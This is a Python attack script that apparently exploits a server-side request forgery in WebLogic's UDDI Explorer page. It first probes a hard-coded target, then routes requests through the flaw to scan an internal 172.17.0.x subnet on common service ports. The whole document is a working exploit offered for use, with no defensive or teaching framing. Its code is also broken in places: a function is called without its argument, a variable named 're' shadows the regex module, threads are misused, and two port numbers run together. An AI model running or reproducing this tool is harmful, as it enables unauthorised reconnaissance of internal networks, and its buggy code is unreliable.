import requests
import time
import re
import threading


def panduan(url):
    payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    url1 = url + payload
    try:
        re = requests.get(url=url1, headers=headers)
        if r"weblogic.uddi.client.structures.exception.XML_SoapException" in re.text and r"IO Exception on sendMessage" not in re.text:
            print("存在CVE-2020-4210")
            ite_ip()
    except:
        print("不存在CVE-2020-4210")


def ite_ip(ip):
    for i in range(1, 256):
        get_ip = '{ip}.{i}'.format(ip=ip, i=i)
        print(get_ip)
        threading.Thread(scan(get_ip))
        time.sleep(3)


def scan(get_ip):
    ports = (
        '21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899',
        '6389', '6479', '7001', '8000''8080')
    for port in ports:
        url2 = url + '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search' % (
            get_ip, port)
        try:
            res = requests.get(url=url2, timeout=15, verify=False, headers=headers)
            reselt1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException', res.text)
            reselt2 = re.findall('but could not connect', res.text)
            reselt3 = re.findall('No route to host', res.text)
            if len(reselt1) != 0 and len(reselt2) == 0 and len(reselt3) == 0:
                print('[!]' + get_ip + ':' + port)
        except:
            pass


if __name__ == '__main__':
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}
    url = 'http://192.168.6.232:7001'
    panduan(url)
    ip = '172.17.0'
    if ip:
        ite_ip(ip)
    else:
        print("no ip")
